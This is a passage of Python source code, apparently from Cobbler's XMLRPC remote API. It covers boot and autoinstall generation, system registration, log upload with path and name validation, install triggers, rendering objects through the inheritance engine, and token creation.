self._log(\"generate_bootcfg\")\n        return self.api.generate_bootcfg(profile, system)\n\n    def generate_script(self, profile: Optional[str] = None, system: Optional[str] = None, name: str = \"\") -> str:\n        \"\"\"\n        This generates the autoinstall script for a system or profile. Profile and System cannot be both given, if they\n        are, Profile wins.\n\n        :param profile: The profile name to generate the script for.\n        :param system: The system name to generate the script for.\n        :param name: Name of the generated script. Must only contain alphanumeric characters, dots and underscores.\n        :return: Some generated script.\n        \"\"\"\n        # This is duplicated from tftpgen.py to prevent log poisoning via a template engine (Cheetah, Jinja2).\n        if not validate_autoinstall_script_name(name):\n            raise ValueError(\"\\\"name\\\" handed to generate_script was not valid!\")\n        self._log(\"generate_script, name is \\\"%s\\\"\" % name)\n        return self.api.generate_script(profile, system, name)\n\n    def get_blended_data(self, profile=None, system=None):\n        \"\"\"\n        Combine all data which is available from a profile and system together and return it.\n\n        :param profile: The profile of the system.\n        :param system: The system for which the data should be rendered.\n        :return: All values which could be blended together through the inheritance chain.\n        \"\"\"\n        if profile is not None and profile != \"\":\n            obj = self.api.find_profile(profile)\n            if obj is None:\n                raise CX(\"profile not found: %s\" % profile)\n        elif system is not None and system != \"\":\n            obj = self.api.find_system(system)\n            if obj is None:\n                raise CX(\"system not found: %s\" % system)\n        else:\n            raise CX(\"internal error, no system or profile specified\")\n        data = utils.blender(self.api, True, obj)\n        return self.xmlrpc_hacks(data)\n\n    def get_settings(self, token=None, **rest) -> dict:\n        \"\"\"\n        Return the contents of our settings file, which is a dict.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: Unused parameter.\n        :return: Get the settings which are currently in Cobbler present.\n        \"\"\"\n        # self._log(\"get_settings\", token=token)\n        results = self.api.settings().to_dict()\n        # self._log(\"my settings are: %s\" % results, debug=True)\n        return self.xmlrpc_hacks(results)\n\n    def get_signatures(self, token=None, **rest) -> dict:\n        \"\"\"\n        Return the contents of the API signatures\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get the content of the currently loaded signatures file.\n        \"\"\"\n        self._log(\"get_signatures\", token=token)\n        results = self.api.get_signatures()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_breeds(self, token=None, **rest) -> list:\n        \"\"\"\n        Return the list of valid breeds as read in from the distro signatures data\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: All valid OS-Breeds which are present in Cobbler.\n        \"\"\"\n        self._log(\"get_valid_breeds\", token=token)\n        results = utils.get_valid_breeds()\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_os_versions_for_breed(self, breed, token=None, **rest) -> list:\n        \"\"\"\n        Return the list of valid os_versions for the given breed\n\n        :param breed: The OS-Breed which is requested.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: All valid OS-versions for a certain breed.\n        \"\"\"\n        self._log(\"get_valid_os_versions_for_breed\", token=token)\n        results = utils.get_valid_os_versions_for_breed(breed)\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_os_versions(self, token=None, **rest) -> list:\n        \"\"\"\n        Return the list of valid os_versions as read in from the distro signatures data\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get all valid OS-Versions\n        \"\"\"\n        self._log(\"get_valid_os_versions\", token=token)\n        results = utils.get_valid_os_versions()\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_archs(self, token=None) -> list:\n        \"\"\"\n        Return the list of valid architectures as read in from the distro signatures data\n\n        :param token: The API-token obtained via the login() method.\n        :return: Get a list of all valid architectures.\n        \"\"\"\n        self._log(\"get_valid_archs\", token=token)\n        results = utils.get_valid_archs()\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_distro_boot_loaders(self, distro_name: str, token=None):\n        \"\"\"\n        Return the list of valid boot loaders for the distro\n\n        :param token: The API-token obtained via the login() method.\n        :param distro_name: The name of the distro for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        self._log(\"get_valid_distro_boot_loaders\", token=token)\n        if distro_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_distro(distro_name)\n        if obj is None:\n            return \"# object not found: %s\" % distro_name\n        return self.api.get_valid_obj_boot_loaders(obj)\n\n    def get_valid_image_boot_loaders(self, image_name: str, token=None):\n        \"\"\"\n        Return the list of valid boot loaders for the image\n\n        :param token: The API-token obtained via the login() method.\n        :param distro_name: The name of the image for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        self._log(\"get_valid_image_boot_loaders\", token=token)\n        if image_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_image(image_name)\n        if obj is None:\n            return \"# object not found: %s\" % image_name\n        return self.api.get_valid_obj_boot_loaders(obj)\n\n    def get_valid_profile_boot_loaders(self, profile_name, token=None):\n        \"\"\"\n        Return the list of valid boot loaders for the profile\n\n        :param token: The API-token obtained via the login() method.\n        :param profile_name: The name of the profile for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        self._log(\"get_valid_profile_boot_loaders\", token=token)\n        if profile_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_profile(profile_name)\n        if obj is None:\n            return \"# object not found: %s\" % profile_name\n        distro = obj.get_conceptual_parent()\n        return self.api.get_valid_obj_boot_loaders(distro)\n\n    def get_valid_system_boot_loaders(self, system_name: str, token=None) -> List[str]:\n        \"\"\"\n        Return the list of valid boot loaders for the system\n\n        :param token: The API-token obtained via the login() method.\n        :param system_name: The name of the system for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.get_valid_archs\n        \"\"\"\n        self._log(\"get_valid_system_boot_loaders\", token=token)\n        if system_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_system(system_name)\n        if obj is None:\n            return \"# object not found: %s\" % system_name\n        parent = obj.get_conceptual_parent()\n\n        if parent and parent.COLLECTION_TYPE == \"profile\":\n            return parent.boot_loaders\n        return self.api.get_valid_obj_boot_loaders(parent)\n\n    def get_repo_config_for_profile(self, profile_name, **rest):\n        \"\"\"\n        Return the yum configuration a given profile should use to obtain all of it's Cobbler associated repos.\n\n        :param profile_name: The name of the profile for which the repository config should be looked up.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The repository configuration for the profile.\n        \"\"\"\n        obj = self.api.find_profile(profile_name)\n        if obj is None:\n            return \"# object not found: %s\" % profile_name\n        return self.api.get_repo_config_for_profile(obj)\n\n    def get_repo_config_for_system(self, system_name, **rest):\n        \"\"\"\n        Return the yum configuration a given profile should use to obtain all of it's Cobbler associated repos.\n\n        :param system_name: The name of the system for which the repository config should be looked up.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The repository configuration for the system.\n        \"\"\"\n        obj = self.api.find_system(system_name)\n        if obj is None:\n            return \"# object not found: %s\" % system_name\n        return self.api.get_repo_config_for_system(obj)\n\n    def get_template_file_for_profile(self, profile_name, path, **rest):\n        \"\"\"\n        Return the templated file requested for this profile\n\n        :param profile_name: The name of the profile to get the template file for.\n        :param path: The path to the template which is requested.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The template file as a str representation.\n        \"\"\"\n        obj = self.api.find_profile(profile_name)\n        if obj is None:\n            return \"# object not found: %s\" % profile_name\n        return self.api.get_template_file_for_profile(obj, path)\n\n    def get_template_file_for_system(self, system_name, path, **rest):\n        \"\"\"\n        Return the templated file requested for this system\n\n        :param system_name: The name of the system to get the template file for.\n        :param path: The path to the template which is requested.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The template file as a str representation.\n        \"\"\"\n        obj = self.api.find_system(system_name)\n        if obj is None:\n            return \"# object not found: %s\" % system_name\n        return self.api.get_template_file_for_system(obj, path)\n\n    def register_new_system(self, info, token=None, **rest):\n        \"\"\"\n        If register_new_installs is enabled in settings, this allows /usr/bin/cobbler-register (part of the koan\n        package) to add new system records remotely if they don't already exist.\n        There is a cobbler_register snippet that helps with doing this automatically for new installs but it can also be\n        used for existing installs.\n\n        See \"AutoRegistration\" on the Wiki.\n\n        :param info: The system information which is provided by the system.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Return 0 if everything succeeded.\n        \"\"\"\n\n        if not self.api.settings().register_new_installs:\n            raise CX(\"registration is disabled in cobbler settings\")\n\n        # validate input\n        name = info.get(\"name\", \"\")\n        profile = info.get(\"profile\", \"\")\n        hostname = info.get(\"hostname\", \"\")\n        interfaces = info.get(\"interfaces\", {})\n        ilen = len(list(interfaces.keys()))\n\n        if name == \"\":\n            raise CX(\"no system name submitted\")\n        if profile == \"\":\n            raise CX(\"profile not submitted\")\n        if ilen == 0:\n            raise CX(\"no interfaces submitted\")\n        if ilen >= 64:\n            raise CX(\"too many interfaces submitted\")\n\n        # validate things first\n        name = info.get(\"name\", \"\")\n        inames = list(interfaces.keys())\n        if self.api.find_system(name=name):\n            raise CX(\"system name conflicts\")\n        if hostname != \"\" and self.api.find_system(hostname=hostname):\n            raise CX(\"hostname conflicts\")\n\n        for iname in inames:\n            mac = info[\"interfaces\"][iname].get(\"mac_address\", \"\")\n            ip = info[\"interfaces\"][iname].get(\"ip_address\", \"\")\n            if ip.find(\"/\") != -1:\n                raise CX(\"no CIDR ips are allowed\")\n            if mac == \"\":\n                raise CX(\"missing MAC address for interface %s\" % iname)\n            if mac != \"\":\n                system = self.api.find_system(mac_address=mac)\n                if system is not None:\n                    raise CX(\"mac conflict: %s\" % mac)\n            if ip != \"\":\n                system = self.api.find_system(ip_address=ip)\n                if system is not None:\n                    raise CX(\"ip conflict: %s\" % ip)\n\n        # looks like we can go ahead and create a system now\n        obj = self.api.new_system()\n        obj.profile = profile\n        obj.name = name\n        if hostname != \"\":\n            obj.hostname = hostname\n        obj.netboot_enabled = False\n        for iname in inames:\n            if info[\"interfaces\"][iname].get(\"bridge\", \"\") == 1:\n                # don't add bridges\n                continue\n            mac = info[\"interfaces\"][iname].get(\"mac_address\", \"\")\n            ip = info[\"interfaces\"][iname].get(\"ip_address\", \"\")\n            netmask = info[\"interfaces\"][iname].get(\"netmask\", \"\")\n            if mac == \"?\":\n                # see koan/utils.py for explanation of network info discovery\n                continue\n            obj.set_mac_address(mac, iname)\n            if hostname != \"\":\n                obj.set_dns_name(hostname, iname)\n            if ip != \"\" and ip != \"?\":\n                obj.set_ip_address(ip, iname)\n            if netmask != \"\" and netmask != \"?\":\n                obj.set_netmask(netmask, iname)\n        self.api.add_system(obj)\n        return 0\n\n    def disable_netboot(self, name, token=None, **rest) -> bool:\n        \"\"\"\n        This is a feature used by the ``pxe_just_once`` support, see manpage. Sets system named \"name\" to no-longer PXE.\n        Disabled by default as this requires public API access and is technically a read-write operation.\n\n        :param name: The name of the system to disable netboot for.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is unused.\n        :return: A boolean indicated the success of the action.\n        \"\"\"\n        self._log(\"disable_netboot\", token=token, name=name)\n        # used by nopxe.cgi\n        if not self.api.settings().pxe_just_once:\n            # feature disabled!\n            return False\n        if self.api.settings().nopxe_with_triggers:\n            # triggers should be enabled when calling nopxe\n            triggers_enabled = True\n        else:\n            triggers_enabled = False\n        systems = self.api.systems()\n        obj = systems.find(name=name)\n        if obj is None:\n            # system not found!\n            return False\n        obj.netboot_enabled = False\n        # disabling triggers and sync to make this extremely fast.\n        systems.add(obj, save=True, with_triggers=triggers_enabled, with_sync=False, quick_pxe_update=True)\n        # re-generate dhcp configuration\n        self.api.sync_dhcp()\n        return True\n\n    def upload_log_data(self, sys_name: str, file: str, size: int, offset: int, data: bytes,\n                        token: Optional[str] = None) -> bool:\n        \"\"\"\n        This is a logger function used by the \"anamon\" logging system to upload all sorts of misc data from Anaconda.\n        As it's a bit of a potential log-flooder, it's off by default and needs to be enabled in our settings.\n\n        :param sys_name: The name of the system for which to upload log data.\n        :param file: The file where the log data should be put.\n        :param size: The size of the data which will be received.\n        :param offset: The offset in the file where the data will be written to.\n        :param data: The data that should be logged.\n        :param token: The API-token obtained via the login() method.\n        :return: True if everything succeeded.\n        \"\"\"\n        if not self.__validate_log_data_params(sys_name, file, size, offset, data, token):\n            return False\n        self._log(\"upload_log_data (file: '%s', size: %s, offset: %s)\" % (file, size, offset), token=token,\n                  name=sys_name)\n\n        # Check if enabled in self.api.settings()\n        if not self.api.settings().anamon_enabled:\n            # feature disabled!\n            return False\n\n        # Find matching system record\n\n        obj = self.api.find_system(name=sys_name)\n        if obj is None:\n            # system not found!\n            self._log(\"upload_log_data - WARNING - system '%s' not found in Cobbler\" % sys_name, token=token,\n                      name=sys_name)\n            return False\n\n        return self.__upload_file(obj.name, file, size, offset, data)\n\n    def __validate_log_data_params(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes,\n                                   token: Optional[str] = None) -> bool:\n        # Validate all types\n        if not (isinstance(sys_name, str) and isinstance(logfile_name, str) and isinstance(size, int)\n                and isinstance(offset, int) and isinstance(data, bytes)):\n            self.logger.warning(\"upload_log_data - One of the parameters handed over had an invalid type!\")\n            return False\n        if token is not None and not isinstance(token, str):\n            self.logger.warning(\"upload_log_data - token was given but had an invalid type.\")\n            return False\n        # Validate sys_name with item regex\n        if not re.fullmatch(item.RE_OBJECT_NAME, sys_name):\n            self.logger.warning(\"upload_log_data - The provided sys_name contained invalid characters!\")\n            return False\n        # Validate logfile_name - this uses the script name validation, possibly we need our own for this one later\n        if not validate_autoinstall_script_name(logfile_name):\n            self.logger.warning(\"upload_log_data - The provided file contained invalid characters!\")\n            return False\n        return True\n\n    def __upload_file(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes) -> bool:\n        \"\"\"\n        Files can be uploaded in chunks, if so the size describes the chunk rather than the whole file. The offset\n        indicates where the chunk belongs the special offset -1 is used to indicate the final chunk.\n\n        :param sys_name: the name of the system\n        :param logfile_name: the name of the file\n        :param size: size of contents (bytes)\n        :param offset: the offset of the chunk\n        :param data: base64 encoded file contents\n        :return: True if the action succeeded.\n        \"\"\"\n        contents = base64.decodebytes(data)\n        del data\n        if offset != -1:\n            if size is not None:\n                if size != len(contents):\n                    return False\n\n        # FIXME: Get the base directory from Cobbler app-settings\n        anamon_base_directory = \"/var/log/cobbler/anamon\"\n        anamon_sys_directory = os.path.join(anamon_base_directory, sys_name)\n\n        file_name = os.path.join(anamon_sys_directory, logfile_name)\n        normalized_path = os.path.normpath(file_name)\n        if not normalized_path.startswith(anamon_sys_directory):\n            self.logger.warning(\"upload_log_data: built path for the logfile was outside of the Cobbler-Anamon log \"\n                                \"directory!\")\n            return False\n\n        if not os.path.isdir(anamon_sys_directory):\n            os.mkdir(anamon_sys_directory, 0o755)\n\n        try:\n            st = os.lstat(file_name)\n        except OSError as e:\n            if e.errno == errno.ENOENT:\n                pass\n            else:\n                raise\n        else:\n            if not stat.S_ISREG(st.st_mode):\n                raise CX(\"destination not a file: %s\" % file_name)\n\n        # TODO: See if we can simplify this at a later point\n        fd = os.open(file_name, os.O_RDWR | os.O_CREAT | os.O_CLOEXEC, 0o644)\n        # log_error(\"fd=%r\" %fd)\n        try:\n            if offset == 0 or (offset == -1 and size == len(contents)):\n                # truncate file\n                fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)\n                try:\n                    os.ftruncate(fd, 0)\n                    # log_error(\"truncating fd %r to 0\" %fd)\n                finally:\n                    fcntl.lockf(fd, fcntl.LOCK_UN)\n            if offset == -1:\n                os.lseek(fd, 0, 2)\n            else:\n                os.lseek(fd, offset, 0)\n            # write contents\n            fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB, len(contents), 0, 2)\n            try:\n                os.write(fd, contents)\n                # log_error(\"wrote contents\")\n            finally:\n                fcntl.lockf(fd, fcntl.LOCK_UN, len(contents), 0, 2)\n            if offset == -1:\n                if size is not None:\n                    # truncate file\n                    fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)\n                    try:\n                        os.ftruncate(fd, size)\n                        # log_error(\"truncating fd %r to size %r\" % (fd,size))\n                    finally:\n                        fcntl.lockf(fd, fcntl.LOCK_UN)\n        finally:\n            os.close(fd)\n        return True\n\n    def run_install_triggers(self, mode, objtype, name, ip, token=None, **rest):\n        \"\"\"\n        This is a feature used to run the pre/post install triggers.\n        See CobblerTriggers on Wiki for details\n\n        :param mode: The mode of the triggers. May be \"pre\", \"post\" or \"firstboot\".\n        :param objtype: The type of object. This should correspond to the collection type.\n        :param name: The name of the object.\n        :param ip: The ip of the objet.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: True if everything worked correctly.\n        \"\"\"\n        self._log(\"run_install_triggers\", token=token)\n\n        if mode != \"pre\" and mode != \"post\" and mode != \"firstboot\":\n            return False\n        if objtype != \"system\" and objtype != \"profile\":\n            return False\n\n        # The trigger script is called with name,mac, and ip as arguments 1,2, and 3 we do not do API lookups here\n        # because they are rather expensive at install time if reinstalling all of a cluster all at once.\n        # We can do that at \"cobbler check\" time.\n        utils.run_triggers(self.api, None, \"/var/lib/cobbler/triggers/install/%s/*\" % mode,\n                           additional=[objtype, name, ip])\n        return True\n\n    def version(self, token=None, **rest):\n        \"\"\"\n        Return the Cobbler version for compatibility testing with remote applications.\n        See api.py for documentation.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The short version of Cobbler.\n        \"\"\"\n        self._log(\"version\", token=token)\n        return self.api.version()\n\n    def extended_version(self, token=None, **rest):\n        \"\"\"\n        Returns the full dictionary of version information.  See api.py for documentation.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The extended version of Cobbler\n        \"\"\"\n        self._log(\"version\", token=token)\n        return self.api.version(extended=True)\n\n    def get_distros_since(self, mtime: float):\n        \"\"\"\n        Return all of the distro objects that have been modified after mtime.\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_distros_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_profiles_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_profiles_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_systems_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_systems_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_repos_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_repos_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_images_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_images_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_mgmtclasses_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_mgmtclasses_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_packages_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_packages_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_files_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_files_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_menus_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_menus_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_repos_compatible_with_profile(self, profile=None, token=None, **rest) -> list:\n        \"\"\"\n        Get repos that can be used with a given profile name.\n\n        :param profile: The profile to check for compatibility.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The list of compatible repositories.\n        \"\"\"\n        self._log(\"get_repos_compatible_with_profile\", token=token)\n        profile = self.api.find_profile(profile)\n        if profile is None:\n            self.logger.info(\"The profile name supplied (\\\"%s\\\") for get_repos_compatible_with_profile was not\"\n                             \"existing\", profile)\n            return []\n        results = []\n        distro = profile.get_conceptual_parent()\n        for current_repo in self.api.repos():\n            # There be dragons!\n            # Accept all repos that are src/noarch but otherwise filter what repos are compatible with the profile based\n            # on the arch of the distro.\n            # FIXME: Use the enum directly\n            if current_repo.arch is None or current_repo.arch.value in [\"\", \"noarch\", \"src\"]:\n                results.append(current_repo.to_dict())\n            else:\n                # some backwards compatibility fuzz\n                # repo.arch is mostly a text field\n                # distro.arch is i386/x86_64\n                if current_repo.arch.value in [\"i386\", \"x86\", \"i686\"]:\n                    if distro.arch.value in [\"i386\", \"x86\"]:\n                        results.append(current_repo.to_dict())\n                elif current_repo.arch.value in [\"x86_64\"]:\n                    if distro.arch.value in [\"x86_64\"]:\n                        results.append(current_repo.to_dict())\n                else:\n                    if distro.arch == current_repo.arch:\n                        results.append(current_repo.to_dict())\n        return results\n\n    def find_system_by_dns_name(self, dns_name):\n        \"\"\"\n        This is used by the puppet external nodes feature.\n\n        :param dns_name: The dns name of the system. This should be the fqdn and not only the hostname.\n        :return: All system information or an empty dict.\n        \"\"\"\n        # FIXME: expose generic finds for other methods\n        # WARNING: this function is /not/ expected to stay in Cobbler long term\n        system = self.api.find_system(dns_name=dns_name)\n        if system is None:\n            return {}\n        else:\n            return self.get_system_as_rendered(system.name)\n\n    def get_distro_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get distribution after passing through Cobbler's inheritance engine.\n\n        :param name: distro name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a distribution.\n        \"\"\"\n\n        self._log(\"get_distro_as_rendered\", name=name, token=token)\n        obj = self.api.find_distro(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_profile_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get profile after passing through Cobbler's inheritance engine.\n\n        :param name: profile name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a profile.\n        \"\"\"\n\n        self._log(\"get_profile_as_rendered\", name=name, token=token)\n        obj = self.api.find_profile(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_system_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get profile after passing through Cobbler's inheritance engine.\n\n        :param name: system name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a system.\n        \"\"\"\n\n        self._log(\"get_system_as_rendered\", name=name, token=token)\n        obj = self.api.find_system(name=name)\n        if obj is not None:\n            _dict = utils.blender(self.api, True, obj)\n            # Generate a pxelinux.cfg?\n            image_based = False\n            profile = obj.get_conceptual_parent()\n            distro = profile.get_conceptual_parent()\n\n            # The management classes stored in the system are just a list of names, so we need to turn it into a full\n            # list of dictionaries (right now we just use the params field).\n            mcs = _dict[\"mgmt_classes\"]\n            _dict[\"mgmt_classes\"] = {}\n            for m in mcs:\n                c = self.api.find_mgmtclass(name=m)\n                if c:\n                    _dict[\"mgmt_classes\"][m] = c.to_dict()\n\n            arch = None\n            if distro is None and profile.COLLECTION_TYPE == \"image\":\n                image_based = True\n                arch = profile.arch\n            else:\n                arch = distro.arch\n\n            if obj.is_management_supported():\n                if not image_based:\n                    _dict[\"pxelinux.cfg\"] = self.tftpgen.write_pxe_file(\n                        None, obj, profile, distro, arch)\n                else:\n                    _dict[\"pxelinux.cfg\"] = self.tftpgen.write_pxe_file(\n                        None, obj, None, None, arch, image=profile)\n\n            return self.xmlrpc_hacks(_dict)\n        return self.xmlrpc_hacks({})\n\n    def get_repo_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get repository after passing through Cobbler's inheritance engine.\n\n        :param name: repository name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a repository.\n        \"\"\"\n\n        self._log(\"get_repo_as_rendered\", name=name, token=token)\n        obj = self.api.find_repo(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_image_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get repository after passing through Cobbler's inheritance engine.\n\n        :param name: image name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as an image.\n        \"\"\"\n\n        self._log(\"get_image_as_rendered\", name=name, token=token)\n        obj = self.api.find_image(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_mgmtclass_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get management class after passing through Cobbler's inheritance engine\n\n        :param name: management class name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a management class.\n        \"\"\"\n\n        self._log(\"get_mgmtclass_as_rendered\", name=name, token=token)\n        obj = self.api.find_mgmtclass(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_package_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get package after passing through Cobbler's inheritance engine\n\n        :param name: package name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a package.\n        \"\"\"\n\n        self._log(\"get_package_as_rendered\", name=name, token=token)\n        obj = self.api.find_package(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_file_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get file after passing through Cobbler's inheritance engine\n\n        :param name: file name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a file.\n        \"\"\"\n\n        self._log(\"get_file_as_rendered\", name=name, token=token)\n        obj = self.api.find_file(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_menu_as_rendered(self, name: str, token: Optional[str] = None, **rest):\n        \"\"\"\n        Get menu after passing through Cobbler's inheritance engine\n\n        :param name: Menu name\n        :param token: Authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a file.\n        \"\"\"\n\n        self._log(\"get_menu_as_rendered\", name=name, token=token)\n        obj = self.api.find_menu(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_random_mac(self, virt_type=\"xenpv\", token=None, **rest):\n        \"\"\"\n        Wrapper for ``utils.get_random_mac()``. Used in the webui.\n\n        :param virt_type: The type of the virtual machine.\n        :param token: The API-token obtained via the login() method. Auth token to authenticate against the api.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The random mac address which shall be used somewhere else.\n        \"\"\"\n        # ToDo: Remove rest param\n        self._log(\"get_random_mac\", token=None)\n        return utils.get_random_mac(self.api, virt_type)\n\n    def xmlrpc_hacks(self, data):\n        \"\"\"\n        Convert None in XMLRPC to just '~' to make extra sure a client that can't allow_none can deal with this.\n\n        ALSO: a weird hack ensuring that when dicts with integer keys (or other types) are transmitted with string keys.\n\n        :param data: The data to prepare for the XMLRPC response.\n        :return: The converted data.\n        \"\"\"\n        return utils.strip_none(data)\n\n    def get_status(self, mode=\"normal\", token=None, **rest):\n        \"\"\"\n        Returns the same information as `cobbler status`\n        While a read-only operation, this requires a token because it's potentially a fair amount of I/O\n\n        :param mode: How the status should be presented.\n        :param token: The API-token obtained via the login() method. Auth token to authenticate against the api.\n        :param rest: This parameter is currently unused for this method.\n        :return: The human or machine readable status of the status of Cobbler.\n        \"\"\"\n        self.check_access(token, \"sync\")\n        return self.api.status(mode=mode)\n\n    def __get_random(self, length: int) -> str:\n        \"\"\"\n        Get a random string of a desired length.\n\n        :param length: The length of the\n        :return: A random string of the desired length from ``/dev/urandom``.\n        \"\"\"\n        b64 = base64.b64encode(os.urandom(length))\n        return b64.decode()\n\n    def __make_token(self, user: str) -> str:\n        \"\"\"\n        Returns a new random token.\n\n        :param user: The user for which the token should be generated.\n        :return: The token which was generated.\n        \"\"\"\n        b64 = self.__get_random(25)\n        self.token_cache[b64] = (time.time(), user)\n        return b64\n\n    @staticmethod\n    def __is_token(token: str) -> bool:\n        \"\"\"\n        Simple 